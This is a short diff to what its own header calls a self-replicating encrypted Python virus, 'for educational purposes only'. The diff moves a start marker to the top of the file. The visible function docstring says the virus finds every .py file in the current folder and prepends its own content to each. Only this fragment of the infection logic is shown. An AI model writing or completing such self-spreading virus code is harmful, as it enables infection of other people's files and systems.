@@ -1,3 +1,5 @@
+# PIEMOLDER:START
+
 #title           :mold-verbose.py
 #description     :Example of a self replicating encypted python virus. 
 #                 For educational purposes only :)
@@ -12,7 +14,7 @@
 # If we move it to the top of the file, all infected files will have the top
 # bit of this file too...
 
-# PIEMOLDER:START
+
 def execute(virus):
 	'''This function molds the pies. It finds all .py files in the current folder
 	and then writes the content of 'virus' to the start of those files.
